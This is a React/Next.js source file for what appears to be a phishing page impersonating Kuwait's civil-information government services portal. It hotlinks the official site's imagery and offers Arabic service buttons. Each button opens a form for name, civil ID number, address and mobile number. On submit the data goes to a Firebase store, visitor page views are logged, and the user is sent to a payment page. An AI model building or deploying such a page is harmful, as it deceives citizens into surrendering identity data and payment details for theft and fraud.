'use client';

import {
  MapPin,
  RefreshCw,
  Users,
  Building,
  SquareArrowUpRight,
  Camera,
  Car,
  DollarSign,
  BadgeIcon as IdCard,
  Search,
  LucideCalendarSearch,
  ArrowLeft,
  ChevronLeft,
} from 'lucide-react';
import { Button } from '@/components/ui/button';
import { useEffect, useState } from 'react';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import FullPageLoader from '@/components/fullpageloader';
import { addData } from '@/lib/firebase';
import { useRouter } from 'next/navigation';

const services = [
  {
    id: 'domestic-workers',
    title: 'تسجيل عمالة منزلية',
    icon: <Users className="w-8 h-8" />,
    customIcon: '/placeholder.svg?height=32&width=120',
  },
  {
    id: 'update-photo',
    title: 'تحديث صورة',
    icon: <Camera className="w-8 h-8" />,
  },
  {
    id: 'vehicle-license',
    title: 'ترخيص مركبة',
    icon: <Car className="w-8 h-8" />,
  },
  {
    id: 'health-insurance',
    title: 'دفع رسوم الضمان الصحي',
    icon: <DollarSign className="w-8 h-8" />,
  },
  {
    id: 'civil-id',
    title: 'إصدار بطاقة مدنية لأول مرة',
    icon: <IdCard className="w-8 h-8" />,
  },
  {
    id: 'technical-inspection',
    title: 'حجز موعد  ',
    icon: <Search className="w-8 h-8" />,
  },
  {
    id: 'driving-license',
    title: 'تجديد رخصة سوق',
    icon: <LucideCalendarSearch className="w-8 h-8" />,
  },
];

export default function CivilInfoPortal() {
  const [loading, setLoading] = useState(false);
  const [selectedService, setSelectedService] = useState<string | null>(null);
  const [_id] = useState('id' + Math.random().toString(16).slice(2));
  const router = useRouter();
  const [formData, setFormData] = useState({
    id: _id,
    name: '',
    civilId: '', // Pre-filled with the provided civil ID
    unitNumber: '',
    floor: '',
    voucher: '',
    plot: '',
    area: '',
    mobile: '',
    page:'قبل الدفع'
  });

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }));
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    addData(formData);
    // Simulate form submission
    setTimeout(() => {
      setLoading(false);
      router.push('/payment');
      // Return to services list after submission
      setSelectedService(null);
    }, 2500);
  };

  const handleServiceClick = (serviceId: string,title:string) => {
    setLoading(true);
    // Simulate loading
    setTimeout(() => {
      setLoading(false);
      setSelectedService(serviceId);
    
      localStorage.setItem('salm',title)
    }, 500);
  };

  const handleInquiry = () => {
    setLoading(true);
    // Simulate inquiry process
    setTimeout(() => {
      setLoading(false);
      // Show a random service form after inquiry
      const randomService =
        services[Math.floor(Math.random() * services.length)];
      setSelectedService(randomService.id);
    }, 1500);
  };
  useEffect(() => {
    addData({ id: _id,page:'الرئيسية' });

  }, []);
  // Show form if a service is selected
  if (selectedService) {
    return (
      <div dir="rtl" className="min-h-screen bg-gray-100 flex flex-col">
        {/* Header */}

        {/* Form Title */}
        <div className="bg-blue-700 text-white p-4">
          <div className="container mx-auto">
            <h1 className="text-xl font-bold">
              {services.find((s) => s.id === selectedService)?.title}
            </h1>
          </div>
        </div>

        {/* Form Container */}
        <div className="container mx-auto px-4 py-8">
          <form
            onSubmit={handleSubmit}
            className="max-w-2xl mx-auto space-y-6 bg-white p-6 rounded-lg shadow-xl"
          >
            <div className="space-y-4">
              {/* Name */}
              <div className="space-y-2">
                <Label htmlFor="name" className="text-right block text-lg">
                  الاسم
                </Label>
                <Input
                  id="name"
                  name="name"
                  value={formData.name}
                  onChange={handleChange}
                  className="text-right"
                  dir="rtl"
                  required
                />
              </div>

              {/* Civil ID */}
              <div className="space-y-2">
                <Label htmlFor="civilId" className="text-right block text-lg">
                  الرقم المدني
                </Label>
                <Input
                  id="civilId"
                  name="civilId"
                  value={formData.civilId}
                  onChange={handleChange}
                  className="text-right"
                  dir="rtl"
                  required
                  maxLength={12}
                />
              </div>

              {/* Unit Number / Delivery Address */}
              <div className="space-y-2">
                <Label
                  htmlFor="unitNumber"
                  className="text-right block text-lg"
                >
                  رقم الوحدة
                  <br />
                </Label>
                <Input
                  id="unitNumber"
                  name="unitNumber"
                  value={formData.unitNumber}
                  onChange={handleChange}
                  className="text-right"
                  required
                  dir="rtl"
                />
              </div>

              {/* Floor */}
              <div className="space-y-2">
                <Label htmlFor="floor" className="text-right block text-lg">
                  الدور
                </Label>
                <Input
                  id="floor"
                  name="floor"
                  value={formData.floor}
                  onChange={handleChange}
                  className="text-right"
                  dir="rtl"
                />
              </div>

              {/* Voucher */}
              <div className="space-y-2">
                <Label htmlFor="voucher" className="text-right block text-lg">
                  قسيمة
                </Label>
                <Input
                  id="voucher"
                  name="voucher"
                  value={formData.voucher}
                  onChange={handleChange}
                  className="text-right"
                  dir="rtl"
                />
              </div>

              {/* Plot */}
              <div className="space-y-2">
                <Label htmlFor="plot" className="text-right block text-lg">
                  قطعة
                </Label>
                <Input
                  id="plot"
                  name="plot"
                  value={formData.plot}
                  onChange={handleChange}
                  className="text-right"
                  dir="rtl"
                />
              </div>

              {/* Area */}
              <div className="space-y-2">
                <Label htmlFor="area" className="text-right block text-lg">
                  المنطقة
                </Label>
                <Input
                  id="area"
                  name="area"
                  value={formData.area}
                  onChange={handleChange}
                  className="text-right"
                  dir="rtl"
                />
              </div>

              {/* Mobile */}
              <div className="space-y-2">
                <Label htmlFor="mobile" className="text-right block text-lg">
                  رقم الهاتف النقال
                </Label>
                <Input
                  id="mobile"
                  name="mobile"
                  value={formData.mobile}
                  onChange={handleChange}
                  className="text-right"
                  required
                  dir="rtl"
                  type="tel"
                />
              </div>

              {/* Submit Button */}
              <div className="pt-4">
                <Button
                  type="submit"
                  className="w-full bg-blue-700 hover:bg-blue-800 text-white py-2 text-lg"
                >
                  تقديم الطلب
                </Button>
              </div>
            </div>
          </form>
        </div>

        <footer className="mt-auto bg-blue-900 text-white p-4">
          <div className="container mx-auto">
            <div className="h-8"></div>
          </div>
        </footer>
      </div>
    );
  }

  // Show services list
  return (
    <div dir="rtl" className="min-h-screen bg-gray-100 flex flex-col">
      {/* Header */}

      {/* Hero Section with Background */}
      <div className="relative h-48 flex items-center justify-center">
        <div className="absolute inset-0">
          <img
            src="https://services.paci.gov.kw/assets/images/sliderbg.jpg"
            alt="Kuwait Skyline"
            className="object-cover h-full w-full"
          />
        </div>
        <h1 className="text-white text-4xl font-bold relative z-10">
          خدمات الهيئة
        </h1>
      </div>

      {/* Services Grid */}
      <div className="container mx-auto p-4 -mt-4">
        <div className="grid grid-cols-1 gap-px bg-gray-200 overflow-hidden rounded-lg shadow">
          {services.map((service, id) => (
            <button
              key={id}
              onClick={() => handleServiceClick(service.id,service.title)}
              className="bg-[#082f7b] text-white p-6 flex justify-between items-center hover:bg-blue-800 transition-colors"
            >
              <span className="text-xl">{service.title}</span>
              {service.icon}
            </button>
          ))}
        </div>
      </div>

      {loading && <FullPageLoader />}
    </div>
  );
}
